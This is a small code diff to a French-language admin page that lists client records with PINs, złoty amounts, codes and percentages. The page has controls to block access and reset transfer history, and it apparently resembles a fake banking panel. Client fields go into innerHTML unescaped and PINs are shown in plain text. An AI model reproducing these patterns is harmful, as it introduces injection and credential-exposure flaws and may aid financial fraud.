@@ -64,21 +64,19 @@ th{background:#fafafa;color:var(--m);font-weight:600}
     </div>
   </div>
 
-  <!-- NOUVEAU : Bloquer / Débloquer -->
   <div class="card">
     <h3 style="margin:0 0 12px">Bloquer ou débloquer l'accès client</h3>
-    <label>Sélectionner l'accès client . <span style="color:var(--r)">requis</span></label>
+    <label>Sélectionner l'accès client. <span style="color:var(--r)">requis</span></label>
     <select id="clientAccess" style="margin-bottom:12px"></select>
     <button class="btn" id="blockBtn" style="width:100%;background:#dc2626;margin-bottom:8px">🔒 Bloquer l'accès client</button>
     <button class="btn" id="unblockBtn" style="width:100%;background:#059669">🔓 Débloquer l'accès client</button>
   </div>
 
-  <!-- NOUVEAU : Actions -->
   <div class="card">
     <h3 style="margin:0 0 12px">Actions sur l'accès client</h3>
-    <label>Sélectionner l'accès client . <span style="color:var(--r)">requis</span></label>
+    <label>Sélectionner l'accès client. <span style="color:var(--r)">requis</span></label>
     <select id="clientAction" style="margin-bottom:10px"></select>
-    <label>Liste des action(s) possible(s) sur un accès . <span style="color:var(--r)">requis</span></label>
+    <label>Liste des action(s) possible(s) sur un accès. <span style="color:var(--r)">requis</span></label>
     <select id="actionType" style="margin-bottom:10px">
       <option>Réinitialiser l'historique des virements</option>
     </select>
@@ -135,7 +133,7 @@ function render(){
     <tr>
       <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:11px">${v.email}</span></td>
       <td><span class="badge">${v.pin}</span></td>
-      <td>${Number(v.montant).toLocaleString('pl-PL')} zł</td>
+      <td>${Number(v.montant||0).toLocaleString('pl-PL', {minimumFractionDigits:2, maximumFractionDigits:2})} zł</td>
       <td>${v.code}</td>
       <td>${v.pct}%</td>
       <td>
@@ -151,7 +149,7 @@ $('saveBtn').onclick = () => {
     nom: $('nom').value.trim(),
     email: $('email').value.trim().toLowerCase(),
     pin: $('pin').value.trim(),
-    montant: Number($('montant').value)||0,
+    montant: $('montant').value === ''? 0 : parseFloat($('montant').value),
     code: $('code').value.trim(),
     msg: $('msg').value.trim(),
     pct: Number($('pct').value),
@@ -188,7 +186,6 @@ window.delClient = (id) => {
   }
 };
 
-// --- AJOUTS POUR LES OUTILS ---
 function refreshLists(){
   const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email}${v.blocked?' (BLOQUÉ)':''}</option>`).join('');
   if($('clientAccess')) $('clientAccess').innerHTML = opts;
